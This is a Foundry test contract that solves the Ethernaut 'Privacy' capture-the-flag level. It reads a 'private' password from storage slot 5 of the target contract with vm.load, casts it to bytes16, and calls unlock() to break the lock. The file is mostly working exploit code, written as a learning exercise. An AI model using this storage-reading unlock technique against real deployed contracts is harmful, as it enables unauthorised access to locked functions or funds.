// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


/**
    @author Jbayonne
    @notice Ethernaut Privacy Level Solution

    The level go throught bytes casting, bitwiss operator and storage layout
    As in "test/Mapping.t.sol" we read memory thanks to vm.load()
 */
import {Test, console} from "forge-std/Test.sol";
import { Privacy } from "src/Privacy.sol";

contract PrivacyTest is Test
{
    Privacy _target;

    function setUp() public
    {
        _target = Privacy(0x59255d288d0f4A600a36FBc0e56158ba76A87053);
    }

    /**
        fuzzTest on the passwork key 

        @notice This test is useless : fuzz stop at the first revert

        It's impossible to get the passwor by brutforcing, we must read the storage

    function test_find_password_fuzz ( bytes16 _key ) public {

        _target.unlock( _key );
        console.logBytes16( _key );
        require( _target.locked() == false );
    }
    */

    /**
        @notice Static array are store in contiguous slot : the size is known at 
        compile time.

        In order to properly read private variable in storage we must use vm.load( _targert, slot ) 
        
        @notice casting bytes shrink the original types and return the STRONGER BYTES
     */
    function test_find_password() public
    {
        bytes32 data;

        data = vm.load( address( _target ), bytes32( uint256(5) ) );

        console.logBytes16( bytes16(data) );
        console.logBytes32( data );
         _target.unlock( bytes16(data) );
  
        require( _target.locked() == false );
    }
}

